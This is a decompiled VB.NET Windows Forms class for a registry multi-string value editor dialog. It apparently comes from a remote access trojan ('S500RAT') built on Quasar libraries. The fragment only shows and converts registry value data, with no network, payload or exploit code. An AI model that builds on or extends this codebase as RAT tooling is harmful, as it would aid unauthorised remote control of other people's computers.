Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Gry.Helper
Imports Microsoft.VisualBasic.CompilerServices
Imports Quasar.Common.Utilities

Namespace S500RAT
	' Token: 0x0200002A RID: 42
	<DesignerGenerated()>
	Public Partial Class FormRegValueEditMultiString
		Inherits Form

		' Token: 0x1700033E RID: 830
		' (get) Token: 0x06000837 RID: 2103 RVA: 0x00044075 File Offset: 0x00042275
		' (set) Token: 0x06000838 RID: 2104 RVA: 0x0004407F File Offset: 0x0004227F
		Private Overridable Property valueDataTxtBox As TextBox

		' Token: 0x1700033F RID: 831
		' (get) Token: 0x06000839 RID: 2105 RVA: 0x00044088 File Offset: 0x00042288
		' (set) Token: 0x0600083A RID: 2106 RVA: 0x00044094 File Offset: 0x00042294
		Private Overridable Property okButton As Button
			<CompilerGenerated()>
			Get
				Return Me._okButton
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.OkButton_Click
				Dim okButton As Button = Me._okButton
				If okButton IsNot Nothing Then
					RemoveHandler okButton.Click, value2
				End If
				Me._okButton = value
				okButton = Me._okButton
				If okButton IsNot Nothing Then
					AddHandler okButton.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000340 RID: 832
		' (get) Token: 0x0600083B RID: 2107 RVA: 0x000440D7 File Offset: 0x000422D7
		' (set) Token: 0x0600083C RID: 2108 RVA: 0x000440E1 File Offset: 0x000422E1
		Private Overridable Property label2 As Label

		' Token: 0x17000341 RID: 833
		' (get) Token: 0x0600083D RID: 2109 RVA: 0x000440EA File Offset: 0x000422EA
		' (set) Token: 0x0600083E RID: 2110 RVA: 0x000440F4 File Offset: 0x000422F4
		Private Overridable Property valueNameTxtBox As TextBox

		' Token: 0x17000342 RID: 834
		' (get) Token: 0x0600083F RID: 2111 RVA: 0x000440FD File Offset: 0x000422FD
		' (set) Token: 0x06000840 RID: 2112 RVA: 0x00044107 File Offset: 0x00042307
		Private Overridable Property label1 As Label

		' Token: 0x17000343 RID: 835
		' (get) Token: 0x06000841 RID: 2113 RVA: 0x00044110 File Offset: 0x00042310
		' (set) Token: 0x06000842 RID: 2114 RVA: 0x0004411C File Offset: 0x0004231C
		Private Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x06000843 RID: 2115 RVA: 0x00044160 File Offset: 0x00042360
		Private Sub OkButton_Click(sender As Object, e As EventArgs)
			Me._value.Data = Quasar.Common.Utilities.ByteConverter.GetBytes(Me.valueDataTxtBox.Text.Split(New String() { vbCrLf }, StringSplitOptions.RemoveEmptyEntries))
			MyBase.Tag = Me._value
			MyBase.DialogResult = DialogResult.OK
			MyBase.Close()
		End Sub

		' Token: 0x06000844 RID: 2116 RVA: 0x000441BC File Offset: 0x000423BC
		Public Sub New(value As RegistrySeeker.RegValueData)
			AddHandler MyBase.Load, AddressOf Me.FormRegValueEditMultiString_Load
			Me._value = value
			Me.InitializeComponent()
			Me.valueNameTxtBox.Text = value.Name
			Me.valueDataTxtBox.Text = String.Join(vbCrLf, Quasar.Common.Utilities.ByteConverter.ToStringArray(value.Data))
		End Sub

		' Token: 0x06000845 RID: 2117 RVA: 0x00044225 File Offset: 0x00042425
		Private Sub FormRegValueEditMultiString_Load(sender As Object, e As EventArgs)
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x06000846 RID: 2118 RVA: 0x00044235 File Offset: 0x00042435
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x040003AB RID: 939
		Private _value As RegistrySeeker.RegValueData
	End Class
End Namespace
